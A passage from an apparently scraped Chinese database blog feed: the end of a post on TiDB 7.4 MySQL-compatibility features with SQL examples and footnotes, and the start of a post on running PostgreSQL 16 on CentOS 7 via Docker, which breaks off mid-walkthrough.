<li><code>tidb_opt_disk_factor</code></li>
<li><code>tidb_opt_distinct_agg_push_down</code></li>
<li><code>tidb_opt_enable_correlation_adjustment</code></li>
<li><code>tidb_opt_enable_late_materialization</code></li>
<li><code>tidb_opt_enable_mpp_shared_cte_execution</code></li>
<li><code>tidb_opt_fix_control</code></li>
<li><code>tidb_opt_force_inline_cte</code></li>
<li><code>tidb_optimizer_selectivity_level</code></li>
<li><code>tidb_opt_insubq_to_join_and_agg</code></li>
<li><code>tidb_opt_join_reorder_threshold</code></li>
<li><code>tidb_opt_limit_push_down_threshold</code></li>
<li><code>tidb_opt_memory_factor</code></li>
<li><code>tidb_opt_mpp_outer_join_fixed_build_side</code></li>
<li><code>tidb_opt_network_factor</code></li>
<li><code>tidb_opt_objective</code></li>
<li><code>tidb_opt_ordering_index_selectivity_threshold</code></li>
<li><code>tidb_opt_prefer_range_scan</code></li>
<li><code>tidb_opt_prefix_index_single_scan</code></li>
<li><code>tidb_opt_projection_push_down</code></li>
<li><code>tidb_opt_range_max_size</code></li>
<li><code>tidb_opt_scan_factor</code></li>
<li><code>tidb_opt_seek_factor</code></li>
<li><code>tidb_opt_skew_distinct_agg</code></li>
<li><code>tidb_opt_three_stage_distinct_agg</code></li>
<li><code>tidb_opt_tiflash_concurrency_factor</code></li>
<li><code>tidb_opt_write_row_id</code></li>
<li><code>tidb_partition_prune_mode</code></li>
<li><code>tidb_plan_cache_max_plan_size</code></li>
<li><code>tidb_prefer_broadcast_join_by_exchange_data_size</code></li>
<li><code>tidb_read_consistency</code></li>
<li><code>tidb_read_staleness</code></li>
<li><code>tidb_replica_read</code></li>
<li><code>tidb_runtime_filter_mode</code></li>
<li><code>tidb_runtime_filter_type</code></li>
<li><code>tidb_session_alias</code></li>
<li><code>tidb_stats_load_sync_wait</code></li>
<li><code>tidb_store_batch_size</code></li>
<li><code>tiflash_fastscan</code></li>
<li><code>tiflash_find_grained_shuffle_stream_count</code></li>
<li><code>tiflash_fine_grained_shuffle_batch_size</code></li>
</ul>
<p>Ps. 在研究这一特性时，发现了一个源码和若干中英文文档问题中的小问题，这是第一次给 <code>pingcap/tidb</code> 和 <code>pingcap/docs</code> 提 PR，特此“马克”一下。</p>
<ul>
<li><a class="link"   href="https://github.com/pingcap/tidb/pull/47609" >[Merged] sessionctx: fix var typo #47609 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/pingcap/docs/pull/15059" >[Merged] system-variables: update docs for hint SET_VAR #15059 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/pingcap/docs-cn/pull/15207" >[Merged] system-variables: update docs for hint SET_VAR #15207 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h4 id="5️⃣-TiDB-7-4-0-新增会话连接属性表-session-account-connect-attrs">5️⃣ TiDB 7.4.0, 新增会话连接属性表 <code>session_account_connect_attrs</code></h4>
<p>在 MySQL 早期版本中，支持从 <code>P_S.session_account_connect_attrs</code> 查看会话的连接属性。<sup class="footnote-ref"><a href="#fn23" id="fnref23">[23]</a></sup></p>
<p>在 TiDB 7.4 中，也已经实现。举例如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> performance_schema.session_account_connect_attrs;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+-----------------+-------------+------------------+</span></span><br><span class="line"><span class="operator">|</span> PROCESSLIST_ID <span class="operator">|</span> ATTR_NAME       <span class="operator">|</span> ATTR_VALUE  <span class="operator">|</span> ORDINAL_POSITION <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+-----------------+-------------+------------------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097154</span> <span class="operator">|</span> _client_name    <span class="operator">|</span> libmysql    <span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097154</span> <span class="operator">|</span> _client_version <span class="operator">|</span> <span class="number">8.0</span><span class="number">.33</span>      <span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097154</span> <span class="operator">|</span> _os             <span class="operator">|</span> Linux       <span class="operator">|</span>                <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097154</span> <span class="operator">|</span> _pid            <span class="operator">|</span> <span class="number">103036</span>      <span class="operator">|</span>                <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097154</span> <span class="operator">|</span> _platform       <span class="operator">|</span> x86_64      <span class="operator">|</span>                <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097154</span> <span class="operator">|</span> os_user         <span class="operator">|</span> shawnyan    <span class="operator">|</span>                <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097154</span> <span class="operator">|</span> program_name    <span class="operator">|</span> mysql       <span class="operator">|</span>                <span class="number">6</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+-----------------+-------------+------------------+</span></span><br><span class="line"><span class="number">7</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>如果通过第三方工具连接，比如 HeidiSQL，则显示为：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> performance_schema.session_account_connect_attrs <span class="keyword">where</span> PROCESSLIST_ID <span class="operator">=</span> <span class="string">&#x27;2097170&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+-----------------+------------+------------------+</span></span><br><span class="line"><span class="operator">|</span> PROCESSLIST_ID <span class="operator">|</span> ATTR_NAME       <span class="operator">|</span> ATTR_VALUE <span class="operator">|</span> ORDINAL_POSITION <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+-----------------+------------+------------------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097170</span> <span class="operator">|</span> _client_name    <span class="operator">|</span> libmariadb <span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097170</span> <span class="operator">|</span> _client_version <span class="operator">|</span> <span class="number">3.2</span><span class="number">.5</span>      <span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097170</span> <span class="operator">|</span> _os             <span class="operator">|</span> Windows    <span class="operator">|</span>                <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097170</span> <span class="operator">|</span> _pid            <span class="operator">|</span> <span class="number">3828</span>       <span class="operator">|</span>                <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097170</span> <span class="operator">|</span> _platform       <span class="operator">|</span> AMD64      <span class="operator">|</span>                <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097170</span> <span class="operator">|</span> _server_host    <span class="operator">|</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  <span class="operator">|</span>                <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097170</span> <span class="operator">|</span> _thread         <span class="operator">|</span> <span class="number">18236</span>      <span class="operator">|</span>                <span class="number">6</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2097170</span> <span class="operator">|</span> program_name    <span class="operator">|</span> HeidiSQL   <span class="operator">|</span>                <span class="number">7</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+-----------------+------------+------------------+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<h4 id="6️⃣-TiDB-7-4-0-新增支持数据类型-FLOAT4-FLOAT8-和-MIDDLEINT">6️⃣ TiDB 7.4.0, 新增支持数据类型 <code>FLOAT4</code>, <code>FLOAT8</code> 和 <code>MIDDLEINT</code></h4>
<p>从 TiDB 7.4 开始，新增数据类型 <code>FLOAT4</code>, <code>FLOAT8</code> 和 <code>MIDDLEINT</code>，以增强 MySQL 兼容性。其中 <code>FLOAT4</code> 实现为 <code>FLOAT</code> 的别名，<code>FLOAT8</code> 实现为 <code>DOUBLE</code> 的别名，<code>MIDDLEINT</code> 实现为 <code>MEDIUMINT</code> 的别名。</p>
<p>示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_type (c1 float4, c2 float8, c3 middleint, c4 int3);</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> t_type\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">       <span class="keyword">Table</span>: t_type</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_type` (</span><br><span class="line">  `c1` <span class="type">float</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `c2` <span class="keyword">double</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `c3` mediumint(<span class="number">9</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `c4` mediumint(<span class="number">9</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8mb4_bin</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>到此，MySQL 8.1 官方文档<sup class="footnote-ref"><a href="#fn24" id="fnref24">[24]</a></sup>中罗列的 16 个来自其他数据库的数据类型，TiDB 7.4 已全部支持。</p>
<p>Ps. 最新版的文档中有一处兼容性描述未更新，已反馈，待更新。</p>
<ul>
<li><a class="link"   href="https://github.com/pingcap/docs-cn/issues/15269" >[Closed] Remove unsupport FLOAT4/FLOAT8 #15269 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="font-color-0080FF-三、总结-font"><font color='#0080FF'>三、总结</font></h2>
<p>到 11 月 15 日，2023 年已过去 87%，TiDB 7.x 系列即将迎来 7.5 LTS 版本。TiDB 在 MySQL 5.7 EOL 之际正式兼容 MySQL 8.0，为用户从 MySQL 5.7 迁移到 TiDB 减轻了工作量，并提供了更多助力。</p>
<p>最后，推荐一篇文章：</p>
<ul>
<li>中文版：<a class="link"   href="https://tidb.net/blog/c91c844c" >是时候了！MySQL 5.7 的下一站，不如试试 TiDB？ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>英文版：<a class="link"   href="https://www.pingcap.com/blog/mysql-57-eol-mysql-alternatives-tidb/" >MySQL 5.7 EOL: Migrating to a MySQL Alternative <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>日文版：<a class="link"   href="https://pingcap.co.jp/mysql-5-7-eol-migrating-to-a-mysql-alternative/" >MySQL 5.7サポート終了：MySQL代替データベースへの移行 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<blockquote>
<p>2023-11-02, update.</p>
<p>Per Oracle’s Lifetime Support policy, as of <strong>October 25, 2023</strong>, MySQL 5.7 is covered under Oracle Sustaining Support.<sup class="footnote-ref"><a href="#fn25" id="fnref25">[25]</a></sup></p>
</blockquote>
<h2 id="感谢">感谢</h2>
<p>在 TiDB 7.4.0 DMR 的发版说明<sup class="footnote-ref"><a href="#fn26" id="fnref26">[26]</a></sup>中发现了自己的名字，感谢 TiDB 社区。</p>
<p>欢迎更多伙伴加入 <a class="link"   href="https://tidb.net/" >TiDB 社区 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h2 id="彩蛋">彩蛋</h2>
<p><strong>TiDB Release Timeline 2023 版</strong></p>
<img  alt="TiDB-Release-Timeline-Map.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/TiDBReleaseTimeline-Map1(1)-1698209426314.png"
                      referrerpolicy="no-referrer"
                >
<p>数据来源：</p>
<ul>
<li><a class="link"   href="https://docs.pingcap.com/zh/tidb/dev/release-timeline" >TiDB 版本发布时间线 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/pingcap/tidb/projects/63" >TiDB Release Kanban <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>End.</p>
<p>ShawnYan<br>
2023-10-17</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://github.com/pingcap/tidb/issues/47332" >https://github.com/pingcap/tidb/issues/47332 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/dev/hardware-and-software-requirements" >https://docs.pingcap.com/zh/tidb/dev/hardware-and-software-requirements <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p><a class="link"   href="https://github.com/pingcap/tidb/pull/45923" >https://github.com/pingcap/tidb/pull/45923 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn4" class="footnote-item"><p><a class="link"   href="https://github.com/pingcap/tidb/pull/46764" >https://github.com/pingcap/tidb/pull/46764 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn5" class="footnote-item"><p><a class="link"   href="https://groups.google.com/g/golang-announce/c/iNNxDTCjZvo" >https://groups.google.com/g/golang-announce/c/iNNxDTCjZvo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn6" class="footnote-item"><p><a class="link"   href="https://github.com/pingcap/tidb/pull/47440" >https://github.com/pingcap/tidb/pull/47440 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn7" class="footnote-item"><p><a class="link"   href="https://github.com/pingcap/tidb/pull/47123" >https://github.com/pingcap/tidb/pull/47123 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref7" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn8" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/command-line-flags-for-tidb-configuration" >https://docs.pingcap.com/zh/tidb/stable/command-line-flags-for-tidb-configuration <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref8" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn9" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-configuration-file" >https://docs.pingcap.com/zh/tidb/stable/tidb-configuration-file <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref9" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn10" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/system-variables" >https://docs.pingcap.com/zh/tidb/stable/system-variables <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref10" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn11" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/dev/sql-statement-admin-pause-ddl" >https://docs.pingcap.com/zh/tidb/dev/sql-statement-admin-pause-ddl <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref11" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn12" class="footnote-item"><p><a class="link"   href="https://dev.mysql.com/doc/refman/8.0/en/optimizer-hints.html#optimizer-hints-table-level" >https://dev.mysql.com/doc/refman/8.0/en/optimizer-hints.html#optimizer-hints-table-level <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref12" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn13" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/dev/optimizer-hints#inl_joint1_name--tl_name-" >https://docs.pingcap.com/zh/tidb/dev/optimizer-hints#inl_joint1_name--tl_name- <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref13" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn14" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-functions#tidb_parse_tso" >https://docs.pingcap.com/zh/tidb/stable/tidb-functions#tidb_parse_tso <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref14" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn15" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/v7.4/partitioned-table#%E5%AF%B9%E7%8E%B0%E6%9C%89%E8%A1%A8%E8%BF%9B%E8%A1%8C%E5%88%86%E5%8C%BA" >https://docs.pingcap.com/zh/tidb/v7.4/partitioned-table#对现有表进行分区 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref15" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn16" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/statistics#%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0" >https://docs.pingcap.com/zh/tidb/stable/statistics#自动更新 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref16" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn17" class="footnote-item"><p><a class="link"   href="https://dev.mysql.com/doc/relnotes/mysql/8.0/en/news-8-0-16.html" >https://dev.mysql.com/doc/relnotes/mysql/8.0/en/news-8-0-16.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref17" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn18" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/v7.4/release-7.4.0#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86" >https://docs.pingcap.com/zh/tidb/v7.4/release-7.4.0#数据库管理 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref18" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn19" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/v7.4/release-7.4.0#%E8%A1%8C%E4%B8%BA%E5%8F%98%E6%9B%B4" >https://docs.pingcap.com/zh/tidb/v7.4/release-7.4.0#行为变更 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref19" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn20" class="footnote-item"><p><a class="link"   href="https://github.com/pingcap/tidb/pull/46155" >https://github.com/pingcap/tidb/pull/46155 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref20" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn21" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/v7.4/release-7.4.0#%E7%A8%B3%E5%AE%9A%E6%80%A7" >https://docs.pingcap.com/zh/tidb/v7.4/release-7.4.0#稳定性 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref21" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn22" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/v7.4/system-variables" >https://docs.pingcap.com/zh/tidb/v7.4/system-variables <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref22" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn23" class="footnote-item"><p><a class="link"   href="https://dev.mysql.com/doc/refman/8.0/en/performance-schema-connection-attribute-tables.html" >https://dev.mysql.com/doc/refman/8.0/en/performance-schema-connection-attribute-tables.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref23" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn24" class="footnote-item"><p><a class="link"   href="https://dev.mysql.com/doc/refman/8.1/en/other-vendor-data-types.html" >https://dev.mysql.com/doc/refman/8.1/en/other-vendor-data-types.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref24" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn25" class="footnote-item"><p><a class="link"   href="https://www.mysql.com/support/eol-notice.html" >https://www.mysql.com/support/eol-notice.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref25" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn26" class="footnote-item"><p><a class="link"   href="https://docs.pingcap.com/zh/tidb/v7.4/release-7.4.0#%E8%B4%A1%E7%8C%AE%E8%80%85" >https://docs.pingcap.com/zh/tidb/v7.4/release-7.4.0#贡献者 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref26" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 7.x</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>tidb</tag>
        <tag>compile</tag>
        <tag>pingcap</tag>
        <tag>tidb 7.x</tag>
      </tags>
  </entry>
  <entry>
    <title>【PG16】后 RHEL 7 时代, PG 16 如何在 CentOS 7 上运行</title>
    <url>/2023/postgresql/pg-16-run-on-centos-7/</url>
    <content><![CDATA[<h2 id="PostgreSQL-16-Released">PostgreSQL 16 Released</h2>
<p>9/14, PostgreSQL 16 正式发布。从发布公告<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> 和 Release Notes<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup> 可以看到 PG16 包含了诸多新特性和增强改进。</p>
<ol>
<li>性能提升，查询计划支持并行 <code>FULL</code> 和 <code>RIGHT</code> 关联。<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup></li>
<li>逻辑复制，支持从 standby 服务器进行复制，支持订阅者并行应用大事务，新增预定义角色 <code>pg_create_subscription</code>。<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup></li>
<li>开发体验，增加了 SQL/JSON 构造函数 (<code>JSON_ARRAY()</code>, <code>JSON_ARRAYAGG()</code>)和恒等函数 (<code>IS JSON</code>)。<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup></li>
<li>监控增强，增加 <code>pg_stat_io</code> 视图，以支持监控 I/O 统计数据。<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup></li>
</ol>
<h2 id="CentOS-7-上-RPM-安装-PG16-EOL">CentOS 7 上 RPM 安装 PG16 (EOL)</h2>
<p>一般情况下，在 CentOS 7 系统上安装 PostgreSQL 只需要两条 yum/dnf 命令即可。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y https://download.postgresql.org/pub/repos/yum/reporpms/EL-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm</span><br><span class="line">sudo yum install -y postgresql16-server</span><br></pre></td></tr></table></figure></div>
<p>但是从 PostgreSQL 16 开始，这种安装方式在 CentOS 7 上已经被停用，所以执行上面两条命令会看到下面的输出。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">No package postgresql16-server available.</span><br><span class="line">Error: Nothing to do</span><br></pre></td></tr></table></figure></div>
<p>从 yum 仓库<sup class="footnote-ref"><a href="#fn7" id="fnref7">[7]</a></sup> 也只能找到 rhel 8/9 的 postgresql16 rpm 包，并没有 rhel 7。</p>
<p>其实相关信息 9 月初已在官方网站上发布了公告<sup class="footnote-ref"><a href="#fn8" id="fnref8">[8]</a></sup>，或许只是注意到的人并不多。</p>
<blockquote>
<p><font color='red'><strong>EOL announcement for RHEL 7</strong></font></p>
<p>PostgreSQL RPM repo stopped adding new packages to the PostgreSQL RPM repo as of Aug 2023, including PostgreSQL 16.</p>
<p>We will maintain older major releases until each major release is EOLed by PostgreSQL project. Please visit here for latest release dates for each major release.</p>
<p>If you have any questions, please either email to <a class="link"   href="mailto:pgsql-pkg-yum@lists.postgresql.org" >pgsql-pkg-yum@lists.postgresql.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, or create a ticket at our redmine.</p>
</blockquote>
<p>那么，仍在使用 CentOS 7 的环境如何安装、升级 PostgreSQL 16 呢？</p>
<h2 id="Docker-运行-PG16（容易）">Docker 运行 PG16（容易）</h2>
<p>PostgreSQL 的官方 Docker 镜像由 the PostgreSQL Docker Community <sup class="footnote-ref"><a href="#fn9" id="fnref9">[9]</a></sup> 维护，提供了 4 个 PG16 的镜像，分别基于 Debian bullseye / Debian Bookworm / alpine3.17 / alpine3.18 。</p>
<p>演示步骤如下：</p>
<ol>
<li>主机的操作系统为 CentOS 7。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hostnamectl</span></span><br><span class="line">   Static hostname: centos7.shawnyan.cn</span><br><span class="line">...</span><br><span class="line">  Operating System: CentOS Linux 7 (Core)</span><br><span class="line">       CPE OS Name: cpe:/o:centos:centos:7</span><br><span class="line">            Kernel: Linux 3.10.0-1160.92.1.el7.x86_64</span><br><span class="line">      Architecture: x86-64</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>拉取 PG16 的 Docker 镜像。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ docker pull postgres:16</span><br><span class="line">16: Pulling from library/postgres</span><br><span class="line">a803e7c4b030: Pull complete</span><br><span class="line">5cf7cbd17f32: Pull complete</span><br><span class="line">ddc24c6f1e18: Pull complete</span><br><span class="line">2b0f4d94850a: Pull complete</span><br><span class="line">fccb5b7554d1: Pull complete</span><br><span class="line">1dd940c0e742: Pull complete</span><br><span class="line">f641e2497276: Pull complete</span><br><span class="line">9c05395a8e66: Pull complete</span><br><span class="line">285e24d225ac: Pull complete</span><br><span class="line">3faa43a5d9fc: Pull complete</span><br><span class="line">482fc7a6b0f4: Pull complete</span><br><span class="line">29ca5fe1b2a4: Pull complete</span><br><span class="line">d3012096b6ce: Pull complete</span><br><span class="line">Digest: sha256:379b7a1223b394106cc20d18a5177ed77738003416057e8898cde10e6b7a082a</span><br><span class="line">Status: Downloaded newer image for postgres:16</span><br><span class="line">docker.io/library/postgres:16</span><br><span class="line"></span><br><span class="line">[shawnyan@centos7 ~]$ docker images postgres</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED      SIZE</span><br><span class="line">postgres     16        ec7f99c50d3c   8 days ago   418MB</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>启动 PG16 容器。</li>
</ol>
